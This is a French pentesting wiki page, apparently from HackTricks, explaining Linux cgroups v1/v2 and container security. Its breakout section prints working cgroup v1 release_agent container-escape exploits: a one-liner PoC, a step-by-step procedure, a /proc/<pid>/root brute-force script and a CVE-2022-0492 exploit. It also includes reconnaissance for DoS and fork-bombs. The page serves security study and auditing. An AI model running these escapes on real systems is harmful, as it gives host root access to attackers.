# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les **control groups** Linux sont le mécanisme du kernel utilisé pour regrouper des processus afin d’assurer la comptabilisation, la limitation, la priorisation et l’application de politiques. Si les namespaces servent principalement à isoler la vue des ressources, les cgroups servent surtout à contrôler **la quantité** de ces ressources qu’un ensemble de processus peut consommer et, dans certains cas, **les classes de ressources** avec lesquelles il peut interagir. Les conteneurs dépendent constamment des cgroups, même lorsque l’utilisateur ne les consulte jamais directement, car presque tous les runtimes modernes ont besoin d’un moyen d’indiquer au kernel « ces processus appartiennent à cette workload, et voici les règles de ressources qui leur sont appliquées ».

C’est pourquoi les container engines placent chaque nouveau conteneur dans son propre sous-arbre de cgroup. Une fois que l’arbre des processus s’y trouve, le runtime peut plafonner la mémoire, limiter le nombre de PIDs, pondérer l’utilisation du CPU, réguler les I/O et restreindre l’accès aux devices. Dans un environnement de production, cela est essentiel à la fois pour la sécurité des environnements multi-tenant et pour une bonne hygiène opérationnelle. Un conteneur dépourvu de contrôles de ressources significatifs peut épuiser la mémoire, inonder le système de processus ou monopoliser le CPU et les I/O, de manière à déstabiliser le host ou les workloads voisins.

Du point de vue de la sécurité, les cgroups sont importants de deux manières distinctes. Premièrement, des limites de ressources incorrectes ou absentes permettent des attaques de déni de service directes. Deuxièmement, certaines fonctionnalités des cgroups, en particulier dans les configurations **cgroup v1** plus anciennes, ont historiquement créé de puissants primitives de breakout lorsqu’elles étaient accessibles en écriture depuis l’intérieur d’un conteneur.

## v1 Vs v2

Deux modèles principaux de cgroups sont utilisés. **cgroup v1** expose plusieurs hiérarchies de controllers, et les anciens writeups d’exploits reposent souvent sur les sémantiques étranges et parfois excessivement puissantes qui y sont disponibles. **cgroup v2** introduit une hiérarchie plus unifiée et un comportement généralement plus propre. Les distributions modernes privilégient de plus en plus cgroup v2, mais des environnements mixtes ou legacy existent encore, ce qui signifie que les deux modèles restent pertinents lors de l’audit de systèmes réels.

Cette différence est importante, car certaines des histoires de container breakout les plus célèbres, comme les abus de **`release_agent`** dans cgroup v1, sont très spécifiquement liés au comportement des anciens cgroups. Un lecteur qui découvre un exploit de cgroup sur un blog puis l’applique aveuglément à un système moderne utilisant uniquement cgroup v2 risque de mal comprendre ce qui est réellement possible sur la cible.

## Inspection

Le moyen le plus rapide de voir où se trouve votre shell actuel est le suivant :
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Le fichier `/proc/self/cgroup` affiche les chemins des cgroups associés au processus actuel. Sur un hôte moderne utilisant cgroup v2, vous verrez souvent une entrée unifiée. Sur les hôtes plus anciens ou hybrides, vous pouvez voir plusieurs chemins de contrôleurs v1. Une fois le chemin identifié, vous pouvez inspecter les fichiers correspondants sous `/sys/fs/cgroup` pour consulter les limites et l'utilisation actuelle.

Sur un hôte utilisant cgroup v2, les commandes suivantes sont utiles :
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ces fichiers révèlent quels contrôleurs existent et lesquels sont délégués aux cgroups enfants. Ce modèle de délégation est important dans les environnements rootless et gérés par systemd, où le runtime peut uniquement être capable de contrôler le sous-ensemble des fonctionnalités des cgroups que la hiérarchie parente délègue effectivement.

## Labo

Une façon d’observer les cgroups en pratique consiste à exécuter un conteneur avec une limite de mémoire :
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Vous pouvez également essayer un conteneur limité par PID :
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ces exemples sont utiles, car ils permettent de relier le flag du runtime à l'interface de fichiers du kernel. Le runtime n'applique pas la règle par magie ; il écrit les paramètres cgroup pertinents, puis laisse le kernel les appliquer à l'arbre de processus.

## Utilisation du runtime

Docker, Podman, containerd et CRI-O utilisent tous les cgroups dans le cadre de leur fonctionnement normal. Les différences ne concernent généralement pas le fait qu'ils utilisent ou non les cgroups, mais plutôt **les valeurs par défaut qu'ils choisissent**, **leur interaction avec systemd**, **le fonctionnement de la délégation rootless**, et **la part de la configuration contrôlée au niveau du moteur plutôt qu'au niveau de l'orchestration**.

Dans Kubernetes, les demandes et limites de ressources deviennent finalement une configuration cgroup sur le node. Le chemin entre le YAML du Pod et l'application de la règle par le kernel passe par le kubelet, le runtime CRI et le runtime OCI, mais les cgroups restent le mécanisme du kernel qui applique finalement la règle. Dans les environnements Incus/LXC, les cgroups sont également largement utilisés, notamment parce que les system containers exposent souvent un arbre de processus plus riche et des attentes opérationnelles davantage similaires à celles d'une VM.

## Mésconfigurations et breakouts

Le cas classique de la sécurité des cgroups est le mécanisme **`release_agent` de cgroup v1**, qui est inscriptible. Dans ce modèle, si un attaquant pouvait écrire dans les bons fichiers cgroup, activer `notify_on_release` et contrôler le chemin stocké dans `release_agent`, le kernel pouvait finir par exécuter un chemin choisi par l'attaquant dans les namespaces initiaux du host lorsque le cgroup devenait vide. C'est pourquoi les anciens writeups accordent autant d'importance à la possibilité d'écrire dans les controllers cgroup, aux options de montage et aux conditions liées aux namespaces/capabilities.

Même lorsque `release_agent` n'est pas disponible, les erreurs de configuration des cgroups restent importantes. Un accès trop large aux devices peut rendre les devices du host accessibles depuis le container. L'absence de limites memory et PID peut transformer une simple code execution en DoS du host. Une délégation cgroup faible dans les scénarios rootless peut également induire les défenseurs en erreur en leur faisant croire qu'une restriction existe alors que le runtime n'a jamais réellement pu l'appliquer.

### Contexte de `release_agent`

La technique `release_agent` s'applique uniquement à **cgroup v1**. L'idée de base est que lorsque le dernier processus d'un cgroup se termine et que `notify_on_release=1` est défini, le kernel exécute le programme dont le chemin est stocké dans `release_agent`. Cette exécution a lieu dans les **namespaces initiaux du host**, ce qui transforme un `release_agent` inscriptible en primitive d'escape depuis un container.

Pour que la technique fonctionne, l'attaquant a généralement besoin de :

- une hiérarchie **cgroup v1** inscriptible
- la possibilité de créer ou d'utiliser un child cgroup
- la possibilité de définir `notify_on_release`
- la possibilité d'écrire un chemin dans `release_agent`
- un chemin qui pointe vers un exécutable du point de vue du host

### PoC classique

Le PoC historique en one-liner est :<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Cette PoC écrit un chemin de payload dans `release_agent`, déclenche la libération du cgroup, puis relit le fichier de sortie généré sur l’hôte.

### Procédure détaillée

La même idée est plus facile à comprendre lorsqu’elle est décomposée en plusieurs étapes.<sup>[[1]](#references)</sup>

1. Créer et préparer un cgroup accessible en écriture :
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifiez le chemin sur l’hôte correspondant au système de fichiers du conteneur :
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Déposez un payload qui sera visible depuis le chemin de l'hôte :
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Déclencher l'exécution en rendant le cgroup vide :
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L’effet est l’exécution du payload côté host avec les privilèges root du host. Dans un exploit réel, le payload écrit généralement un fichier de preuve, lance un reverse shell ou modifie l’état du host.

### Variante de chemin relatif utilisant `/proc/<pid>/root`

Dans certains environnements, le chemin host vers le système de fichiers du container n’est pas évident ou est masqué par le storage driver. Dans ce cas, le chemin du payload peut être exprimé via `/proc/<pid>/root/...`, où `<pid>` est un PID host appartenant à un processus du container actuel. C’est la base de la variante de brute force par chemin relatif :<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
L’astuce pertinente ici ne réside pas dans le brute force lui-même, mais dans la forme du chemin : `/proc/<pid>/root/...` permet au kernel de résoudre un fichier à l’intérieur du filesystem du container depuis le namespace de l’hôte, même lorsque le chemin direct du stockage de l’hôte n’est pas connu à l’avance.

### Variant CVE-2022-0492

En 2022, CVE-2022-0492 a montré que l’écriture dans `release_agent` de cgroup v1 ne vérifiait pas correctement la présence de `CAP_SYS_ADMIN` dans le **user namespace initial**. Cela rendait la technique beaucoup plus accessible sur les kernels vulnérables, car un processus de container capable de monter une hiérarchie de cgroup pouvait écrire dans `release_agent` sans être déjà privilégié dans le user namespace de l’hôte.<sup>[[3]](#references)</sup>

Exploit minimal :
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Sur un kernel vulnérable, l’hôte exécute `/proc/self/exe` avec les privilèges root de l’hôte.

Pour une exploitation pratique, commencez par vérifier si l’environnement expose encore des chemins cgroup-v1 accessibles en écriture ou un accès dangereux aux périphériques :
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` est présent et accessible en écriture, vous êtes déjà dans le domaine du legacy-breakout :
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si le chemin du cgroup lui-même ne permet pas un escape, l'utilisation pratique suivante consiste souvent à provoquer un déni de service ou à effectuer de la reconnaissance :
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ces commandes indiquent rapidement si le workload peut lancer un fork-bomb, consommer agressivement de la mémoire ou exploiter une interface cgroup legacy accessible en écriture.

## Checks

Lors de l’examen d’une cible, l’objectif des checks cgroup est de déterminer quel modèle cgroup est utilisé, si le container voit des chemins de contrôleurs accessibles en écriture et si d’anciens primitives de breakout telles que `release_agent` sont même pertinentes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Ce qui est intéressant ici :

- Si `mount | grep cgroup` affiche **cgroup v1**, les anciens writeups sur les breakouts deviennent plus pertinents.
- Si `release_agent` existe et est accessible, cela mérite immédiatement une investigation plus approfondie.
- Si la hiérarchie cgroup visible est accessible en écriture et que le container dispose également de capabilities élevées, l’environnement mérite un examen beaucoup plus attentif.

Si vous découvrez **cgroup v1**, des mounts de controllers accessibles en écriture, et un container disposant également de capabilities élevées ou d’une protection seccomp/AppArmor faible, cette combinaison mérite une attention particulière. Les cgroups sont souvent considérés comme un sujet banal de gestion des ressources, mais ils ont historiquement fait partie de certaines des chaînes d’escape de container les plus instructives, précisément parce que la frontière entre « contrôle des ressources » et « influence sur l’host » n’était pas toujours aussi nette qu’on le supposait.

## Valeurs par défaut des runtimes

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Les containers sont automatiquement placés dans des cgroups ; les limites de ressources sont optionnelles, sauf si elles sont définies avec des flags | omettre `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` ; `--device` ; `--privileged` |
| Podman | Activé par défaut | `--cgroups=enabled` est la valeur par défaut ; les valeurs par défaut du namespace cgroup varient selon la version de cgroup (`private` avec cgroup v2, `host` dans certaines configurations cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, accès relâché aux devices, `--privileged` |
| Kubernetes | Activé par défaut via le runtime | Les pods et les containers sont placés dans des cgroups par le runtime du node ; le contrôle précis des ressources dépend de `resources.requests` / `resources.limits` | omettre les resource requests/limits, accès privilégié aux devices, mauvaise configuration du runtime au niveau de l’host |
| containerd / CRI-O | Activé par défaut | Les cgroups font partie de la gestion normale du lifecycle | configurations directes du runtime qui relâchent les contrôles des devices ou exposent d’anciennes interfaces cgroup v1 accessibles en écriture |

La distinction importante est que **l’existence des cgroups** est généralement la configuration par défaut, tandis que les **contraintes de ressources utiles** sont souvent optionnelles, sauf si elles sont explicitement configurées.

## Références

- [1] [Comprendre les escapes de containers](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Escape d’un container privilégié - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Nouvelle vulnérabilité Linux CVE-2022-0492 affectant les Cgroups : les containers peuvent-ils s’échapper ?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
